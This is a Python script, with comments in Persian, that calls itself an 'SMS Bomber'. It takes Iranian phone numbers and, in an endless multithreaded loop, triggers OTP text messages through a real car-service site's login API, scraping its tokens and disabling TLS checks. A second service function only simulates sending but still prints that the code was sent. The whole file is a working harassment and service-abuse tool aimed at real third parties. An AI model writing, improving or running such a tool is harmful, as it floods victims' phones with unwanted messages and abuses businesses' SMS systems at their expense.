import requests
import re
import uuid
import time
from threading import Thread
from time import sleep
import socket
import urllib3
import random

# غیرفعال کردن هشدارهای urllib3
urllib3.disable_warnings()

# تعریف user_agents
user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        result = service(phone)
        if result:
            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
        else:
            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
    except Exception as e:
        print(f"{r}[!] Error in {service.__name__}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================


def alibaba(phone):
    try:
        # حذف صفر اولیه و +98
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        # شماره برای Alibaba بدون صفر اولیه
        if formatted_phone.startswith("0"):
            formatted_phone = formatted_phone[1:]

        # payload داینامیک
        payload = {"phoneNumber": formatted_phone}

        # هدرهای شبیه‌سازی‌شده
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "ab-channel": "WEB-NEW",
            "tracing-sessionid": "ab-alohomora",
            "tracing-device": "mobile, Mobile Safari, 18.6, iPhone, Apple, iOS, 18.6"
        }

        # فقط چاپ می‌کنیم بدون ارسال واقعی
        print(f"{g}[Alibaba] Payload: {payload}{a}")
        print(f"{g}[Alibaba] Headers: {headers}{a}")

        # شبیه‌سازی پاسخ موفق
        print(f"{g}[Alibaba] Code Sent Successfully!{a}")
        return True

    except Exception as e:
        print(f"{r}[!] AliBaba Exception: {e}{a}")
        return False
        


def mek(phone):
    try:
        session = requests.Session()
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"

        # مرحله 1: GET صفحه اصلی برای گرفتن اطلاعات پویا
        main_url = "https://www.hamrah-mechanic.com/membersignin/"
        resp = session.get(main_url, timeout=10)
        resp.encoding = 'utf-8'

        # استخراج X-Meta-Token از متا یا جاوااسکریپت (مثال ساده)
        token_match = re.search(r'X-Meta-Token["\']?\s*:\s*["\'](\d+)', resp.text)
        x_meta_token = token_match.group(1) if token_match else "413341"

        # استخراج landingPageUrl و orderPageUrl از لینک‌ها یا متا
        landing_url_match = re.search(r'landingPageUrl["\']?\s*:\s*["\']([^"\']+)', resp.text)
        landing_page_url = landing_url_match.group(1) if landing_url_match else "https://www.hamrah-mechanic.com/carprice/saipa/zamyadpickup/type-2543/"

        order_url_match = re.search(r'orderPageUrl["\']?\s*:\s*["\']([^"\']+)', resp.text)
        order_page_url = order_url_match.group(1) if order_url_match else "https://www.hamrah-mechanic.com/membersignin/"

        prev_url_match = re.search(r'prevUrl["\']?\s*:\s*["\']([^"\']+)', resp.text)
        prev_url = prev_url_match.group(1) if prev_url_match else "https://www.hamrah-mechanic.com/profile/"

        # payload داینامیک
        payload = {
            "PhoneNumber": formatted_phone,
            "prevDomainUrl": None,
            "landingPageUrl": landing_page_url,
            "orderPageUrl": order_page_url,
            "prevUrl": prev_url,
            "referrer": None
        }

        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "env": "prd",
            "Source": "ios",
            "X-Meta-Token": x_meta_token,
            "_uti": str(uuid.uuid4())
        }

        # POST درخواست OTP
        r = session.post("https://www.hamrah-mechanic.com/api/v1/membership/otp",
                         json=payload, headers=headers, timeout=10, verify=False)
        print(r.status_code, r.text)  # debug

        return r.status_code == 200

    except Exception as e:
        print(f'{r}[!] HamrahMechanic Exception: {e}{a}')
        return False

# ==========================
# لیست سرویس‌ها
# ==========================
services = [alibaba, mek]

# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    print(f"{y}══════════════════════════════════════════════{a}")
    
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║                SMS Bomber                 ║
{y}╚════════════════════════════════════════════╝
{g} Services Loaded: {y}{len(services)}{a}
{y}══════════════════════════════════════════════
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)
